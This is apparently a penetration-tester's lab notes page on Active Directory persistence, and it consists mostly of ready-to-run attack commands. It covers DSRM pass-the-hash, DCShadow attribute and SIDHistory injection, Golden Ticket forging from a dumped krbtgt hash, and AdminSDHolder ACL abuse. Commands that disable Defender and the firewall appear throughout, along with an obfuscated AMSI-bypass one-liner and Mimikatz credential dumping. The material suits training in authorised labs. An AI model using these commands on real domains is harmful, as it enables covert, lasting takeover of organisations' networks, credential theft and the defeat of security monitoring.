---
title: Windows Domain Persistence and Dominance
published: 2025-02-08
description: "Commands for enumerating windows"
image: "./img/img.jpg"
tags: [Notes ,AD, windows]
category: 'Notes'
draft: false
---

# DSRM

- DSRM is Directory Services Restore Mode. 
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password. 
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. 
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

```powershell
# From the Domain Admin Powershell Permission
# Create Session
$sess = New-PSSession -ComputerName dc

# Disable Firewall and AV
Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1

# Enter Session
Enter-PSSession $sess

# ByPass AMSI
powershell -ep bypass
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Enter New KeyReg
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# If KeyReg Exist:
# Get-ItemProperty to see if DsrmAdminLogonBehavior is set to 2
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
# If DsrmAdminLogonBehavior is not set to 2
Set-ItemProperty -Name "DsrmAdminLogonBehavior" -Value 2
# Get-ItemProperty to see if DsrmAdminLogonBehavior is set to 2
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"


# Compare the Administrator hash with the Administrator hash of below command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc


# Dump DSRM password (needs DA privs) to be used for the command below
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc

# Use below command to pass the hash. Use the hash from the above command
# Needs to be excute from another powershell windows with local admin
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

# Session
$sess = New-PSSession -ComputerName dc
Enter-PSSession $sess
# or
ls \\dcorp-dc\c$
```

# DCShadow Change Attribute

It simulates the behavior of a Domain Controller (using protocols like RPC used only by DC) to inject its own data, bypassing most of the common security controls and including your SIEM. It shares some similarities with the DCSync attack (already present in the lsadump module of mimikatz). 

```bash
# run as system
PsExec.exe -i -s cmd 

# push attribute 
mimikatz.exe
lsadump::dcshadow /object:student5 /attribute:badpwdcount /value:3333
lsadump::dcshadow /object:student5 /attribute:PwdLastset /value:0x1D4B32777877508

# open cmd as admin
# push the attribute change
mimikatz.exe
lsadump::dcshadow /push
```

# DCShadow - SIDHistory

Domain Admins is the AD group that most people think of when discussing Active Directory administration. This group has full admin rights by default on all domain-joined servers and workstations, Domain Controllers, and Active Directory. 

It gains admin rights on domain-joined computers since when these systems are joined to AD, the Domain Admins group is added to the computer’s Administrators group.


Enterprise Admins is a group in the forest root domain that has full AD rights to every domain in the AD forest. It is granted this right through membership in the Administrators group in every domain in the forest.

```bash
. .\Powerview.ps1
Get-DomainGroup -SamAccountName "Enterprise Admins"
```

## DCShadow
It simulates the behavior of a Domain Controller (using protocols like RPC used only by DC) to inject its own data, bypassing most of the common security controls and including your SIEM. It shares some similarities with the DCSync attack (already present in the lsadump module of mimikatz). 

```bash
# run as system
PsExec.exe -i -s cmd 
```

SID History is an attribute that supports migration scenarios. Every user account has an associated Security IDentifier (SID) which is used to track the security principal and the access the account has when connecting to resources. SID History enables access for another account to effectively be cloned to another and is extremely useful to ensure users retain access when moved (migrated) from one domain to another.

```bash
# push attribute 
mimikatz.exe
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21-1070240333-336889418-1185445934-519

# open cmd as admin
# push the attribute change
mimikatz.exe
lsadump::dcshadow /push
```

# DCShadow - Hash

```bash
# run as system
PsExec.exe -i -s cmd 

# push attribute 
mimikatz.exe
lsadump::dcshadow /object:jenkinsadmin /attribute:unicodePwd /value:00000000000000000000000000000000


# open cmd as admin
# see the hash
lsdump:dcsync /user:jenkinsadmin

#push the attribute change
mimikatz.exe
lsadump::dcshadow /push

# see the changed hash
lsdump:dcsync /user:jenkinsadmin

# Pass the hash attack
sekurlsa::pth /user:jenkinsadmin /domain: /ntlm:00000000000000000000000000000000 /run:powershell.exe
```

# Golden Ticket

Golden Ticket attacks can be carried out against Active Directory domains, where access control is implemented using Kerberos tickets issued to authenticated users by a Key Distribution Service. The attacker gains control over the domain's Key Distribution Service account (KRBTGT account) by stealing its NTLM hash. This allows the attacker to generate Ticket Granting Tickets (TGTs) for any account in the Active Directory domain. With valid TGTs, the attacker can request access to any resource/system on its domain from the Ticket Granting Service (TGS).

Because the attacker is controlling the component of the access control system that is responsible for issuing Ticket Granting Tickets (TGTs), then he has the golden ticket to access any resource on the domain.

```sh
. .\Powerview.ps1
Get-DomainUser -SamAccountName Administrator

# Do Over the PAss hash with an user with access to the DC
# Execute mimikatz on DC as DA to get krbtgt hash
$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local


# Disable Firewall and AV
Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1

# Enter Session
Enter-PSsession $sess

# ByPass AMSI
powershell -ep bypass
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Get all the hash and the important krbtgt
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

## Get krbtgt silently
The DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.

```sh
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'


# On any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

klist
ls \\dcorp-dc\c$
cd \\dcorp-dc\c$
```

# AdminSDHolder - Adding Permission

The general goal of an AdminSDHolder attack is to apply changes to the object, in many cases this means changes to the ACL. This can take many forms, but commonly an attacker may choose to add accounts to this list, giving them the same amount of privilege as other protected accounts and groups already in the AdminSDHolder object.

```sh
# First get DA
Import-Module powerview.ps1


# Adding Permission
# Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=pentesting,DC=local' -PrincipalIdentity student5 -Rights All -Verbose

# Other interesting permissions (ResetPassword, WriteMembers)
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=pentesting,DC=local' -PrincipalIdentity student1 -Rights ResetPassword -Verbose


# Invoking SDpropagator
https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory

# Create session to DC and load Invoke-SDPropagator.ps1 in the session
$sess = New-PSSession -ComputerName dc.pentesting.local -credential student1
Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
Enter-PSSession -Session $sess


# Invoke Invoke-SDPropagator.ps1 from the session
Invoke-SDPropagator -ShowProgress -TimeoutMinutes 1 -Verbose


# Check ACL Access
# Check the Domain Admins Permission to see if our user is there now.
# PowerView as normal user:
Get-DomainObjectAcl -SamAccountName "domain admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
Get-DomainObjectAcl -SamAccountName "Domain Controllers" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
Get-DomainObjectAcl -SamAccountName "Enterprise Admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
Get-DomainObjectAcl -SamAccountName "Replicator" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
Get-DomainObjectAcl -SamAccountName "Schema Admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
```

# AdminSDHolder - Abusing Permission

Abusing if we were able to add ourself to Domain Admin ACL

```bash
# Check access before to see that you do not have access to DA
Get-DomainGroupMember -SamAccountName "Domain Admins" -Recurse

# Abusing FullControl using PowerView:
import-module .\powerview.ps1
Add-DomainGroupMember -Identity 'Domain Admins' -Members student5 -Verbose

# Check access to see that now you do have access to DA
Get-DomainGroups -SamAccountName "Domain Admins" -Recurse


# Password Reset for any account
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=pentesting,DC=local' -PrincipalIdentity student529 -Rights ResetPassword -Verbose

# Abusing ResetPassword using PowerView:
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
# Enter Session with new password
Enter-PSSession -Computername ad -credential pentesting\Administrator


# Extra
# Enable Remote Desktop
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
# Activate the firewall rule
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
# Enable authentication via RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
```


